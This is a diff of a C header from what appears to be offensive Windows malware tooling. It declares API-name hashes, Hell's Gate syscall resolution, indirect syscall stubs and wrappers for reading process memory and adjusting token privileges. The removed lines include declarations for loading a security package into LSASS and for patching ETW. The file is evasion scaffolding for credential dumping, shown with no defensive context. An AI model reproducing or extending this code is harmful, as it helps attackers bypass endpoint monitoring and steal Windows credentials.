@@ -5,7 +5,6 @@
 #include "ntdefs.h"
 
 /* DJB2 hashes of Nt* function names */
-#define H_NtOpenProcess              0x5003C058
 #define H_NtClose                    0x8B8E133D
 #define H_NtQueryVirtualMemory       0xE39D8E5D
 #define H_NtReadVirtualMemory        0xC24062E3
@@ -25,22 +24,10 @@
 #define H_NtOpenProcessToken         0x7BD07459
 #define H_NtAdjustPrivilegesToken    0x6921F9CD
 #define H_NtGetNextProcess           0x62B37525
-#define H_NtCreateProcessEx          0xA9E925B7
-#define H_NtDuplicateToken           0x3000ECC3
-#define H_NtDuplicateObject          0x2388EE19
-#define H_NtSetInformationThread     0x54212E31
 #define H_NtDelayExecution           0x0A49084A
-#define H_NtCreateUserProcess        0x5F8E4559
-#define H_NtWaitForSingleObject      0x4C6DC63C
-#define H_RtlCreateProcessParametersEx   0x19132CBB
-#define H_RtlDestroyProcessParameters    0xE916BC14
-#define H_RtlReportSilentProcessExit     0xA262E05B
 
-#define H_NtProtectVirtualMemory     0x082962C8
 #define H_NtDeviceIoControlFile      0xA40C4BD0
 #define H_NtQuerySystemInformation   0xEE4F73A8
-#define H_EtwEventWrite              0x24A8D022
-#define H_AddSecurityPackageW        0x5A913429
 
 #define H_LdrLoadDll                    0x0307DB23
 #define H_StartServiceCtrlDispatcherW   0x88F0D677
@@ -49,7 +36,6 @@
 
 /* Syscall numbers (resolved at runtime via Hell's Gate) */
 typedef struct _SYSCALL_TABLE {
-    DWORD NtOpenProcess;
     DWORD NtClose;
     DWORD NtQueryVirtualMemory;
     DWORD NtReadVirtualMemory;
@@ -69,21 +55,13 @@ typedef struct _SYSCALL_TABLE {
     DWORD NtOpenProcessToken;
     DWORD NtAdjustPrivilegesToken;
     DWORD NtGetNextProcess;
-    DWORD NtCreateProcessEx;
-    DWORD NtDuplicateToken;
-    DWORD NtDuplicateObject;
-    DWORD NtSetInformationThread;
     DWORD NtDelayExecution;
-    DWORD NtCreateUserProcess;
-    DWORD NtWaitForSingleObject;
-    DWORD NtProtectVirtualMemory;
     DWORD NtDeviceIoControlFile;
     DWORD NtQuerySystemInformation;
 } SYSCALL_TABLE;
 
 /* Address of `syscall` instruction in ntdll (for indirect calls) */
 typedef struct _SYSCALL_ADDR_TABLE {
-    PVOID NtOpenProcess;
     PVOID NtClose;
     PVOID NtQueryVirtualMemory;
     PVOID NtReadVirtualMemory;
@@ -103,20 +81,9 @@ typedef struct _SYSCALL_ADDR_TABLE {
     PVOID NtOpenProcessToken;
     PVOID NtAdjustPrivilegesToken;
     PVOID NtGetNextProcess;
-    PVOID NtCreateProcessEx;
-    PVOID NtDuplicateToken;
-    PVOID NtDuplicateObject;
-    PVOID NtSetInformationThread;
     PVOID NtDelayExecution;
-    PVOID NtCreateUserProcess;
-    PVOID NtWaitForSingleObject;
-    PVOID NtProtectVirtualMemory;
     PVOID NtDeviceIoControlFile;
     PVOID NtQuerySystemInformation;
-    PVOID RtlReportSilentProcessExit;
-    PVOID EtwEventWrite;
-    PVOID RtlCreateProcessParametersEx;
-    PVOID RtlDestroyProcessParameters;
     PVOID LdrLoadDll;
     PVOID pfnStartDispatcher;
     PVOID pfnRegHandler;
@@ -129,7 +96,6 @@ extern PVOID g_ret_gadget;
 
 BOOL resolve_syscalls(void);
 BOOL resolve_service_funcs(void);
-BOOL load_ssp_into_lsass(const wchar_t *dll_path);
 
 /* Indirect syscall stubs (defined in syscalls_gas.S / syscalls.asm)
  * Each variant shifts N stack slots to fix the +0x10 offset from
@@ -137,12 +103,8 @@ BOOL load_ssp_into_lsass(const wchar_t *dll_path);
 extern NTSTATUS indirect_syscall(DWORD ssn, PVOID syscall_addr, ...);
 extern NTSTATUS indirect_syscall_s2(DWORD ssn, PVOID syscall_addr, ...);
 extern NTSTATUS indirect_syscall_s7(DWORD ssn, PVOID syscall_addr, ...);
-extern NTSTATUS indirect_syscall_s10(DWORD ssn, PVOID syscall_addr, ...);
 
 /* ── Typed wrappers ───────────────────────────────────────── */
-
-NTSTATUS sys_NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
 
 NTSTATUS sys_NtClose(HANDLE Handle);
 
@@ -207,30 +169,7 @@ NTSTATUS sys_NtAdjustPrivilegesToken(HANDLE TokenHandle, BOOLEAN DisableAllPrivi
 NTSTATUS sys_NtGetNextProcess(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
     ULONG HandleAttributes, ULONG Flags, PHANDLE NewProcessHandle);
 
-NTSTATUS sys_NtCreateProcessEx(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags,
-    HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort,
-    ULONG InJob);
-
-NTSTATUS sys_NtDuplicateToken(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly,
-    TOKEN_TYPE TokenType, PHANDLE NewTokenHandle);
-
-NTSTATUS sys_NtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle,
-    HANDLE TargetProcessHandle, PHANDLE TargetHandle,
-    ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options);
-
-NTSTATUS sys_NtSetInformationThread(HANDLE ThreadHandle,
-    DWORD ThreadInformationClass, PVOID ThreadInformation,
-    ULONG ThreadInformationLength);
-
 NTSTATUS sys_NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
-
-NTSTATUS sys_NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable,
-    PLARGE_INTEGER Timeout);
-
-NTSTATUS sys_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
-    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
 
 NTSTATUS sys_NtDeviceIoControlFile(HANDLE FileHandle, HANDLE Event,
     PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
@@ -240,8 +179,6 @@ NTSTATUS sys_NtDeviceIoControlFile(HANDLE FileHandle, HANDLE Event,
 NTSTATUS sys_NtQuerySystemInformation(ULONG SystemInformationClass,
     PVOID SystemInformation, ULONG SystemInformationLength,
     PULONG ReturnLength);
-
-void patch_etw(void);
 
 /* PEB helpers */
 PVOID get_peb(void);
